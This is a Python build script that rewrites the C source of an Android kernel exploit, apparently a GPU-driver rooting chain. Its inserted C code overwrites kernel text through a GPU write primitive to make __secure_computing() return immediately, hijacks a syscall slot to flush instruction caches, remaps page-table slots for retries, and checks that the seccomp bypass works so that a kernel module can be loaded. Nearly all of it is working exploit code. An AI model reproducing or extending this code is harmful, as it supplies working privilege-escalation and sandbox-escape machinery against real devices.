#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Generate the v1.3 probe source from the v1.2 source.

v1.3 does NOT touch the Mali/JIT_FREE chain (v1.2, RESEARCH_LOG section 36).
It only hardens the *post-root* phaseK kernel-text patch for
__secure_computing() so that insmod no longer depends on a probabilistic GPU
write plus an unreliable MMU-dump readback.

Three exact string replacements:

  R1  add seccomp_bypassed() + flush_text_page() helpers next to sc_allowed()
  R2  always flush the seccomp text page, even when the readback is stale
  R3  phaseK2: functional check + at most 2 bounded retries through fresh
      L2 slots (504/505), which force a new GPU page-table walk

Run from the repository root:
    python hlk-root-dist/probe/v13/make_v13.py

Input : backup/pre-v13-*/probe/jit_write_probe_v16.c   (v1.2, pinned by md5)
Output: hlk-root-dist/probe/jit_write_probe_v16.c        (atomic replace)
"""
import hashlib
import os
import sys

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..', '..'))
DIST = os.path.join(ROOT, 'hlk-root-dist')
V12_MD5 = '4fa78963675ac8f18f47d473c7da0253'


def find_v12():
    latest = os.path.join(ROOT, 'backup', 'LATEST_V13.txt')
    with open(latest, 'r', encoding='utf-8') as f:
        bk = f.read().strip()
    return os.path.join(ROOT, bk, 'probe', 'jit_write_probe_v16.c')


R1_OLD = 'static void pick_hook_candidates(void)\n'

R1_NEW = r'''/* ---- v1.3: functional arbiter for the phaseK seccomp text patch --------
 *
 * The MMU-dump readback is NOT authoritative (C-40): a GPU text write can be
 * live while CPU-side dump_phys_batch() still returns the old cache line.
 * phaseK used to gate its icache flush on that readback, so a false negative
 * left some CPUs executing the stale prologue of __secure_computing() and
 * insmod died with SIGSYS (rc=159, RESEARCH_LOG section 36.5).
 *
 * 104 is an arm64 sys_ni_syscall hole and is NOT on the app seccomp
 * allowlist (C-19).  Calling it in a throwaway child is completely harmless:
 * with the filter active the child is killed by SIGSYS; with the patch live
 * it simply returns -ENOSYS.  sc_allowed() already implements exactly the
 * fork + poll + reap pattern, so reuse it instead of trusting any readback. */
static int seccomp_bypassed(void)
{
	return sc_allowed(104);
}

/* Invalidate the kernel text page holding @va on every online CPU.  The
 * hijacked syscall slot still points at flush_icache_range() here.  Calling
 * this unconditionally is harmless, and phaseK2 needs it after a retry. */
static void flush_text_page(uint64_t va)
{
	int ki;
	uint64_t pg = va & ~(uint64_t)(PAGE - 1);

	for (ki = 0; ki < g_ncpu; ki++) {
		cpu_set_t cs;
		CPU_ZERO(&cs);
		CPU_SET(g_cpus[ki], &cs);
		if (sched_setaffinity(0, sizeof(cs), &cs) != 0)
			continue;
		(void)syscall(g_hook_slot, (long)pg, (long)(pg + PAGE));
		icache_sled();
	}
	pin_cpu();
}

static void pick_hook_candidates(void)
'''

R2_OLD = '''\t\t\t\t\tif (sig_landed) {
\t\t\t\t\t\tint ki;
\t\t\t\t\t\tuint64_t pg2 = va_sig & ~(PAGE - 1);
\t\t\t\t\t\tfor (ki = 0; ki < g_ncpu; ki++) {
\t\t\t\t\t\t\tcpu_set_t cs;
\t\t\t\t\t\t\tCPU_ZERO(&cs);
\t\t\t\t\t\t\tCPU_SET(g_cpus[ki], &cs);
\t\t\t\t\t\t\tif (sched_setaffinity(0,
\t\t\t\t\t\t\t\tsizeof(cs), &cs) != 0)
\t\t\t\t\t\t\t\tcontinue;
\t\t\t\t\t\t\t(void)syscall(g_hook_slot,
\t\t\t\t\t\t\t\t(long)pg2,
\t\t\t\t\t\t\t\t(long)(pg2 + PAGE));
\t\t\t\t\t\t\ticache_sled();
\t\t\t\t\t\t}
\t\t\t\t\t\tpin_cpu();
\t\t\t\t\t\tmark("phaseK: %s applied",
\t\t\t\t\t\t     kpatches[pi].tag);
\t\t\t\t\t}
'''

R2_NEW = '''\t\t\t\t\t/* v1.3: the readback is a hint, not a verdict.
\t\t\t\t\t * Always flush the seccomp text page, even when
\t\t\t\t\t * dump_phys_batch() could not see the new word:
\t\t\t\t\t * the GPU write can be live while the CPU-side
\t\t\t\t\t * dump still returns a stale cache line. */
\t\t\t\t\tif (sig_landed ||
\t\t\t\t\t    strcmp(kpatches[pi].sym,
\t\t\t\t\t\t   "seccomp_bypass") == 0) {
\t\t\t\t\t\tflush_text_page(va_sig);
\t\t\t\t\t\tmark("phaseK: %s applied%s",
\t\t\t\t\t\t     kpatches[pi].tag,
\t\t\t\t\t\t     sig_landed ? "" :
\t\t\t\t\t\t     " (forced, readback stale)");
\t\t\t\t\t}
'''

R3_OLD = '\t\t\twcc16 = rt_text + off_commit;\n'

R3_NEW = '''
			/* ---- phaseK2 (v1.3): deterministic seccomp bypass ----
			 *
			 * phaseK points L2 slot 501 at a 2 MB block, writes one
			 * word, then RE-POINTS THE SAME SLOT at a different
			 * block for the next patch.  The GPU walker caches that
			 * translation, so the first write after a re-point can
			 * silently go to the old block (phaseJ has the same
			 * failure and works around it with a fresh channel).
			 *
			 * Instead of believing the readback we ask the kernel:
			 * is syscall 104 still SIGSYS'd?  If it is, redo ONLY
			 * the single-word seccomp patch through a NEVER-USED
			 * L2 slot (504/505), which forces a fresh page-table
			 * walk, then ask again.  Bounded to 2 extra GPU writes
			 * and only on the failure path.
			 *
			 * Even if this still fails the boot is NOT lost:
			 * ksu_bootstrap.sh v1.3 retries insmod through a
			 * seccomp-free call_usermodehelper() kernel thread. */
			{
				const char *rtry = getenv("PROBE_SECCOMP_RETRY");
				int maxtry = (!rtry || !*rtry) ? 2 : atoi(rtry);
				int secok = seccomp_bypassed();
				int t2;

				if (maxtry > 3)
					maxtry = 3;
				if (maxtry < 0)
					maxtry = 0;
				mark("phaseK2: seccomp functional=%d retries=%d",
				     secok, maxtry);
				for (t2 = 0; t2 < maxtry && !secok; t2++) {
					int slot = 504 + t2;
					uint64_t off2 =
						ksym_off("seccomp_bypass");
					uint64_t pa2 = img_base + off2;
					uint64_t va2 = l2_base +
						(uint64_t)slot * BLOCK_2M +
						(pa2 & (BLOCK_2M - 1));

					if (off2 == ~0ull) {
						mark("phaseK2: no seccomp symbol");
						break;
					}
					if (chan_map_block(fd, jc1, fd2, jc2,
							   pte_slot, l2_win,
							   g_l2_pa, slot,
							   pa2 & ~(BLOCK_2M - 1),
							   &atom_num) != 0) {
						mark("phaseK2: slot%d remap failed",
						     slot);
						continue;
					}
					gpu_write32(fd2, jc2, va2,
						    0xD65F03C0u, atom_num++);
					cache_thrash(32ull << 20);
					flush_text_page(rt_text + off2);
					usleep(50000);
					secok = seccomp_bypassed();
					mark("phaseK2: retry %d slot=%d functional=%d",
					     t2 + 1, slot, secok);
				}
				mark("phaseK2: seccomp bypass %s",
				     secok ? "CONFIRMED" :
				     "FAILED (UMH fallback will cover insmod)");
			}
			wcc16 = rt_text + off_commit;
'''


def main():
    src = find_v12()
    with open(src, 'r', encoding='utf-8', newline='') as f:
        text = f.read()
    md5 = hashlib.md5(text.encode('utf-8')).hexdigest()
    if md5 != V12_MD5:
        sys.exit('!! v1.2 source md5 mismatch: %s (want %s)' % (md5, V12_MD5))
    print('input : %s (md5 %s)' % (src, md5))

    for tag, old, new in (('R1', R1_OLD, R1_NEW),
                          ('R2', R2_OLD, R2_NEW),
                          ('R3', R3_OLD, R3_NEW)):
        n = text.count(old)
        if n != 1:
            sys.exit('!! %s: expected 1 match, got %d' % (tag, n))
        text = text.replace(old, new, 1)
        print('  %s applied' % tag)

    dst = os.path.join(DIST, 'probe', 'jit_write_probe_v16.c')
    tmp = dst + '.v13.tmp'
    with open(tmp, 'w', encoding='utf-8', newline='') as f:
        f.write(text)
    os.replace(tmp, dst)
    with open(dst, 'r', encoding='utf-8', newline='') as f:
        out = f.read()
    print('output: %s' % dst)
    print('  bytes=%d md5=%s' % (len(out.encode('utf-8')),
                                 hashlib.md5(out.encode('utf-8')).hexdigest()))


if __name__ == '__main__':
    main()
